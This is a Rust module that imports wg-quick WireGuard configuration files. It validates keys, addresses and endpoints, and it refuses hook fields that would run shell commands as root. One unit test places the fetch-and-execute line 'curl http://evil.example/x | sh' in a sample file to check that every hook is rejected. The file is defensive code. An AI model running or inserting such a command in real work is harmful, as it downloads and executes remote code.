//! Importing a WireGuard configuration file.
//!
//! The file is an `wg-quick` file, which is a superset of what the kernel
//! takes: it can carry `PostUp`, `PreDown` and friends, shell commands that
//! `wg-quick` runs as root. **This importer never runs, stores or forwards any
//! of them.** It is a whitelist parser: a recognised field is validated and
//! kept, anything else, including every hook, is an error that names the line.
//! Silently dropping an unknown line would be wrong in the other direction: the
//! operator would believe the tunnel behaves as their file says.
//!
//! One interface and exactly one peer are accepted. A client that leaves
//! through a single exit has one peer; a file with two describes something this
//! manager does not implement.

use std::net::{IpAddr, SocketAddr};

use hrd_core::redact::Secret;
use hrd_core::{Error, Result};

use crate::base64;
use crate::ipnet::IpNet;

/// Files larger than this are not WireGuard configurations.
pub const MAX_FILE: usize = 64 * 1024;

#[derive(Debug)]
pub struct WgConfig {
    pub private_key: Secret,
    pub addresses: Vec<IpNet>,
    pub dns: Vec<IpAddr>,
    pub mtu: Option<u16>,
    pub listen_port: Option<u16>,
    pub peer: WgPeer,
}

#[derive(Debug)]
pub struct WgPeer {
    pub public_key: String,
    pub preshared_key: Option<Secret>,
    pub allowed_ips: Vec<IpNet>,
    pub endpoint: Endpoint,
    pub persistent_keepalive: Option<u16>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Endpoint {
    Ip(SocketAddr),
    Host { host: String, port: u16 },
}

impl Endpoint {
    pub fn port(&self) -> u16 {
        match self {
            Endpoint::Ip(a) => a.port(),
            Endpoint::Host { port, .. } => *port,
        }
    }
}

impl std::fmt::Display for Endpoint {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Endpoint::Ip(a) => write!(f, "{a}"),
            Endpoint::Host { host, port } => write!(f, "{host}:{port}"),
        }
    }
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Section {
    None,
    Interface,
    Peer,
}

fn bad(line: usize, msg: impl std::fmt::Display) -> Error {
    Error::invalid(format!("WireGuard file, line {line}: {msg}"))
}

fn key32(line: usize, what: &str, v: &str) -> Result<()> {
    match base64::decode(v) {
        Some(b) if b.len() == 32 && v.len() == 44 => Ok(()),
        _ => Err(bad(line, format!("{what} is not a WireGuard key (44 characters of base64 encoding 32 bytes)"))),
    }
}

fn number<T: std::str::FromStr>(line: usize, what: &str, v: &str) -> Result<T> {
    if v.is_empty() || !v.bytes().all(|b| b.is_ascii_digit()) {
        return Err(bad(line, format!("{what} must be a number")));
    }
    v.parse().map_err(|_| bad(line, format!("{what} is out of range")))
}

fn hostname_ok(h: &str) -> bool {
    if h.is_empty() || h.len() > 253 {
        return false;
    }
    let labels: Vec<&str> = h.split('.').collect();
    let all_numeric = labels.iter().all(|l| l.bytes().all(|b| b.is_ascii_digit()));
    if all_numeric {
        // Looks like an address that failed to parse as one: `999.1.1.1`,
        // `1.2.3`. Better refused than looked up.
        return false;
    }
    labels.iter().all(|l| {
        !l.is_empty()
            && l.len() <= 63
            && !l.starts_with('-')
            && !l.ends_with('-')
            && l.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
    })
}

fn parse_endpoint(line: usize, v: &str) -> Result<Endpoint> {
    if let Ok(a) = v.parse::<SocketAddr>() {
        if a.port() == 0 {
            return Err(bad(line, "Endpoint port must not be 0"));
        }
        return Ok(Endpoint::Ip(a));
    }
    let (host, port) = v.rsplit_once(':').ok_or_else(|| bad(line, "Endpoint must be host:port or [ipv6]:port"))?;
    if host.starts_with('[') || host.contains(':') {
        return Err(bad(line, "an IPv6 Endpoint must be written [address]:port"));
    }
    let port: u16 = number(line, "Endpoint port", port)?;
    if port == 0 {
        return Err(bad(line, "Endpoint port must not be 0"));
    }
    if !hostname_ok(host) {
        return Err(bad(line, format!("Endpoint host {host:?} is not a valid host name")));
    }
    Ok(Endpoint::Host { host: host.to_ascii_lowercase(), port })
}

const HOOKS: &[&str] = &["preup", "postup", "predown", "postdown"];

/// Parse and validate a configuration.
pub fn parse(text: &str) -> Result<WgConfig> {
    if text.len() > MAX_FILE {
        return Err(Error::invalid(format!("WireGuard file is larger than {MAX_FILE} bytes")));
    }
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);

    let mut section = Section::None;
    let (mut n_iface, mut n_peer) = (0, 0);

    let mut private_key: Option<(usize, String)> = None;
    let mut addresses: Vec<IpNet> = Vec::new();
    let mut dns: Vec<IpAddr> = Vec::new();
    let mut mtu: Option<u16> = None;
    let mut listen_port: Option<u16> = None;

    let mut public_key: Option<String> = None;
    let mut preshared: Option<String> = None;
    let mut allowed: Vec<IpNet> = Vec::new();
    let mut endpoint: Option<Endpoint> = None;
    let mut keepalive: Option<u16> = None;

    for (i, raw) in text.lines().enumerate() {
        let n = i + 1;
        if raw.len() > 1024 {
            return Err(bad(n, "line is implausibly long"));
        }
        // `wg-quick` strips everything from the first `#`.
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if let Some(rest) = line.strip_prefix('[') {
            let name = rest.strip_suffix(']').ok_or_else(|| bad(n, "unterminated section header"))?.trim().to_ascii_lowercase();
            section = match name.as_str() {
                "interface" => {
                    n_iface += 1;
                    if n_iface > 1 {
                        return Err(bad(n, "a second [Interface] section: a file describes one interface"));
                    }
                    Section::Interface
                }
                "peer" => {
                    n_peer += 1;
                    if n_peer > 1 {
                        return Err(bad(n, "a second [Peer] section: a network group leaves through exactly one exit, so the file must have exactly one [Peer]"));
                    }
                    Section::Peer
                }
                other => return Err(bad(n, format!("unknown section [{other}]"))),
            };
            continue;
        }
        let (key, value) = line.split_once('=').ok_or_else(|| bad(n, "expected Key = Value"))?;
        let key = key.trim().to_ascii_lowercase();
        let value = value.trim();
        if value.is_empty() {
            return Err(bad(n, format!("{} has no value", key)));
        }
        match (section, key.as_str()) {
            (Section::None, _) => return Err(bad(n, "a setting before any [Interface] or [Peer] section")),

            (Section::Interface, k) if HOOKS.contains(&k) => {
                return Err(bad(
                    n,
                    format!("{} is refused: commands in an imported file are never run by this manager. Remove the line; routing, addresses and firewalling are set up by the manager itself", &line[..line.find('=').unwrap_or(0)].trim()),
                ));
            }
            (Section::Interface, "privatekey") => {
                if private_key.is_some() {
                    return Err(bad(n, "PrivateKey given twice"));
                }
                key32(n, "PrivateKey", value)?;
                private_key = Some((n, value.to_string()));
            }
            (Section::Interface, "address") => {
                for part in value.split(',') {
                    addresses.push(part.trim().parse().map_err(|e: String| bad(n, e))?);
                }
            }
            (Section::Interface, "dns") => {
                for part in value.split(',') {
                    let p = part.trim();
                    dns.push(p.parse().map_err(|_| bad(n, format!("DNS entry {p:?} must be an IP address (search domains are not supported)")))?);
                }
            }
            (Section::Interface, "mtu") => {
                let m: u16 = number(n, "MTU", value)?;
                if !(1280..=1500).contains(&m) {
                    return Err(bad(n, "MTU must be between 1280 and 1500"));
                }
                mtu = Some(m);
            }
            (Section::Interface, "listenport") => {
                let p: u16 = number(n, "ListenPort", value)?;
                if p == 0 {
                    return Err(bad(n, "ListenPort must not be 0"));
                }
                listen_port = Some(p);
            }
            (Section::Interface, "table" | "fwmark" | "saveconfig") => {
                return Err(bad(n, format!("{} is not supported: the manager owns routing and marks", key)));
            }
            (Section::Interface, _) => return Err(bad(n, format!("unknown [Interface] field {:?}", line.split('=').next().unwrap_or("").trim()))),

            (Section::Peer, "publickey") => {
                if public_key.is_some() {
                    return Err(bad(n, "PublicKey given twice"));
                }
                key32(n, "PublicKey", value)?;
                public_key = Some(value.to_string());
            }
            (Section::Peer, "presharedkey") => {
                if preshared.is_some() {
                    return Err(bad(n, "PresharedKey given twice"));
                }
                key32(n, "PresharedKey", value)?;
                preshared = Some(value.to_string());
            }
            (Section::Peer, "allowedips") => {
                for part in value.split(',') {
                    allowed.push(part.trim().parse().map_err(|e: String| bad(n, e))?);
                }
            }
            (Section::Peer, "endpoint") => {
                if endpoint.is_some() {
                    return Err(bad(n, "Endpoint given twice"));
                }
                endpoint = Some(parse_endpoint(n, value)?);
            }
            (Section::Peer, "persistentkeepalive") => {
                keepalive = Some(number(n, "PersistentKeepalive", value)?);
            }
            (Section::Peer, _) => return Err(bad(n, format!("unknown [Peer] field {:?}", line.split('=').next().unwrap_or("").trim()))),
        }
    }

    if n_iface != 1 {
        return Err(Error::invalid(format!("WireGuard file must have exactly one [Interface] section, found {n_iface}")));
    }
    if n_peer != 1 {
        return Err(Error::invalid(format!(
            "WireGuard file must have exactly one [Peer] section, found {n_peer}: a network group leaves through one exit"
        )));
    }
    let (_, private_key) = private_key.ok_or_else(|| Error::invalid("WireGuard file has no PrivateKey"))?;
    if addresses.is_empty() {
        return Err(Error::invalid("WireGuard file has no Address"));
    }
    let public_key = public_key.ok_or_else(|| Error::invalid("WireGuard file has no [Peer] PublicKey"))?;
    if allowed.is_empty() {
        return Err(Error::invalid("WireGuard file has no [Peer] AllowedIPs"));
    }
    let endpoint = endpoint.ok_or_else(|| Error::invalid("WireGuard file has no [Peer] Endpoint"))?;

    if !allowed.iter().any(IpNet::is_default_v4) {
        return Err(Error::invalid(
            "AllowedIPs must contain 0.0.0.0/0: a group's clients have no other interface, so anything the tunnel does not route has no path at all",
        ));
    }
    if !addresses.iter().any(|a| a.addr.is_ipv4()) {
        return Err(Error::invalid("Address must contain an IPv4 address"));
    }

    Ok(WgConfig {
        private_key: Secret::new(private_key),
        addresses,
        dns,
        mtu,
        listen_port,
        peer: WgPeer {
            public_key,
            preshared_key: preshared.map(Secret::new),
            allowed_ips: allowed,
            endpoint,
            persistent_keepalive: keepalive.filter(|k| *k > 0),
        },
    })
}

impl WgConfig {
    /// Whether the tunnel can carry IPv6: an IPv6 interface address and a
    /// `::/0` route. The group's policy blocks IPv6 otherwise.
    pub fn carries_ipv6(&self) -> bool {
        self.addresses.iter().any(IpNet::is_v6) && self.peer.allowed_ips.iter().any(IpNet::is_default_v6)
    }

    /// The text `wg setconf` reads, with the endpoint already resolved to an
    /// address. Contains key material, hence [`Secret`]; it is written to the
    /// helper's stdin and never to a file or an argument.
    pub fn render_setconf(&self, endpoint: SocketAddr) -> Secret {
        let mut s = String::new();
        s.push_str("[Interface]\n");
        s.push_str(&format!("PrivateKey = {}\n", self.private_key.expose()));
        if let Some(p) = self.listen_port {
            s.push_str(&format!("ListenPort = {p}\n"));
        }
        s.push_str("\n[Peer]\n");
        s.push_str(&format!("PublicKey = {}\n", self.peer.public_key));
        if let Some(k) = &self.peer.preshared_key {
            s.push_str(&format!("PresharedKey = {}\n", k.expose()));
        }
        let ips: Vec<String> = self.peer.allowed_ips.iter().map(|n| n.to_string()).collect();
        s.push_str(&format!("AllowedIPs = {}\n", ips.join(", ")));
        s.push_str(&format!("Endpoint = {endpoint}\n"));
        if let Some(k) = self.peer.persistent_keepalive {
            s.push_str(&format!("PersistentKeepalive = {k}\n"));
        }
        Secret::new(s)
    }

    /// The client's own public key, computed from the private key.
    pub fn public_key(&self) -> Result<String> {
        derive_public(self.private_key.expose())
    }
}

/// Curve25519 public key for a WireGuard private key, both in WireGuard's
/// base64 form.
pub fn derive_public(private_b64: &str) -> Result<String> {
    let raw = base64::decode(private_b64).filter(|b| b.len() == 32).ok_or_else(|| Error::invalid("not a WireGuard private key"))?;
    let mut bytes = [0u8; 32];
    bytes.copy_from_slice(&raw);
    let secret = x25519_dalek::StaticSecret::from(bytes);
    let public = x25519_dalek::PublicKey::from(&secret);
    Ok(base64::encode(public.as_bytes()))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn key(fill: u8) -> String {
        base64::encode(&[fill; 32])
    }

    fn sample() -> String {
        format!(
            "# exit: de-1\n[Interface]\nPrivateKey = {}\nAddress = 10.66.1.2/32, fd66:1::2/128\nDNS = 10.66.0.1\nMTU = 1380\n\n[Peer]\nPublicKey = {}\nPresharedKey = {}\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = gw.example.org:51820  # the VPS\nPersistentKeepalive = 25\n",
            key(1),
            key(2),
            key(3)
        )
    }

    #[test]
    fn a_normal_file_parses_and_round_trips_to_setconf() {
        let c = parse(&sample()).unwrap();
        assert_eq!(c.addresses.len(), 2);
        assert_eq!(c.dns, vec!["10.66.0.1".parse::<IpAddr>().unwrap()]);
        assert_eq!(c.mtu, Some(1380));
        assert_eq!(c.peer.endpoint, Endpoint::Host { host: "gw.example.org".into(), port: 51820 });
        assert_eq!(c.peer.persistent_keepalive, Some(25));
        assert!(c.carries_ipv6());
        let conf = c.render_setconf("203.0.113.9:51820".parse().unwrap());
        let t = conf.expose();
        assert!(t.contains("Endpoint = 203.0.113.9:51820"));
        assert!(!t.contains("Address") && !t.contains("DNS") && !t.contains("MTU"), "wg-quick-only fields must not reach wg setconf:\n{t}");
    }

    #[test]
    fn every_hook_is_refused_whatever_its_spelling() {
        for hook in ["PostUp", "postup", "PRE-UP".replace('-', "").as_str(), "PreDown", "PostDown"] {
            let f = sample().replace("MTU = 1380", &format!("{hook} = curl http://evil.example/x | sh"));
            let e = parse(&f).unwrap_err().to_string();
            assert!(e.contains("never run"), "{hook}: {e}");
        }
    }

    #[test]
    fn unknown_and_unsupported_fields_are_errors_not_silently_dropped() {
        for extra in ["Table = off", "FwMark = 51820", "SaveConfig = true", "Foo = bar"] {
            let f = sample().replace("MTU = 1380", extra);
            assert!(parse(&f).is_err(), "{extra}");
        }
        let f = sample().replace("PersistentKeepalive = 25", "Weird = 1");
        assert!(parse(&f).is_err());
    }

    #[test]
    fn one_peer_exactly() {
        let two = format!("{}\n[Peer]\nPublicKey = {}\nAllowedIPs = 10.0.0.0/8\n", sample(), key(9));
        assert!(parse(&two).unwrap_err().to_string().contains("exactly one [Peer]"), "{}", parse(&two).unwrap_err());
        let none = sample().split("[Peer]").next().unwrap().to_string();
        assert!(parse(&none).is_err());
    }

    #[test]
    fn a_partial_tunnel_is_refused_because_nothing_else_routes() {
        let f = sample().replace("0.0.0.0/0, ::/0", "10.0.0.0/8");
        assert!(parse(&f).unwrap_err().to_string().contains("0.0.0.0/0"));
    }

    #[test]
    fn an_ipv4_only_tunnel_does_not_carry_ipv6() {
        let f = sample().replace("0.0.0.0/0, ::/0", "0.0.0.0/0").replace(", fd66:1::2/128", "");
        assert!(!parse(&f).unwrap().carries_ipv6());
        let f = sample().replace("0.0.0.0/0, ::/0", "0.0.0.0/0");
        assert!(!parse(&f).unwrap().carries_ipv6(), "an ::/0 route is also needed");
    }

    #[test]
    fn malformed_values_name_their_line() {
        for (from, to) in [
            ("MTU = 1380", "MTU = 12"),
            ("MTU = 1380", "MTU = lots"),
            ("DNS = 10.66.0.1", "DNS = dns.example.org"),
            ("Address = 10.66.1.2/32, fd66:1::2/128", "Address = 10.66.1.2/33"),
            ("gw.example.org:51820", "gw.example.org"),
            ("gw.example.org:51820", "gw.example.org:0"),
            ("gw.example.org:51820", "999.1.1.1:51820"),
            ("gw.example.org:51820", "fd00::1:51820"),
            ("gw.example.org:51820", "-bad-.example:51820"),
            ("PersistentKeepalive = 25", "PersistentKeepalive = -1"),
        ] {
            let f = sample().replace(from, to);
            let e = parse(&f).unwrap_err().to_string();
            assert!(e.contains("line"), "{to}: {e}");
        }
    }

    #[test]
    fn keys_must_be_canonical_32_byte_base64() {
        let short = sample().replacen(&key(1), "AAAA", 1);
        assert!(parse(&short).is_err());
        let not_b64 = sample().replacen(&key(1), &"!".repeat(44), 1);
        assert!(parse(&not_b64).is_err());
    }

    #[test]
    fn windows_line_endings_bom_and_comments_are_tolerated() {
        let f = format!("\u{feff}{}", sample().replace('\n', "\r\n"));
        parse(&f).unwrap();
    }

    #[test]
    fn a_setting_outside_any_section_is_refused() {
        assert!(parse("PrivateKey = x\n").is_err());
        assert!(parse("[Whatever]\n").is_err());
        assert!(parse("[Interface\n").is_err());
    }

    #[test]
    fn ipv6_endpoints_need_brackets() {
        let f = sample().replace("gw.example.org:51820", "[2001:db8::1]:51820");
        assert!(matches!(parse(&f).unwrap().peer.endpoint, Endpoint::Ip(_)));
    }

    /// RFC 7748 section 6.1, Alice: a public test vector, not a secret.
    #[test]
    fn public_key_derivation_matches_rfc_7748() {
        let alice_priv = hex("77076d0a7318a57d3c16c17251b26645df4c2f87ebc0992ab177fba51db92c2a");
        let alice_pub = hex("8520f0098930a754748b7ddcb43ef75a0dbf3a0d26381af4eba4a98eaa9b4e6a");
        let got = derive_public(&base64::encode(&alice_priv)).unwrap();
        assert_eq!(got, base64::encode(&alice_pub));
    }

    fn hex(s: &str) -> Vec<u8> {
        (0..s.len()).step_by(2).map(|i| u8::from_str_radix(&s[i..i + 2], 16).unwrap()).collect()
    }
}
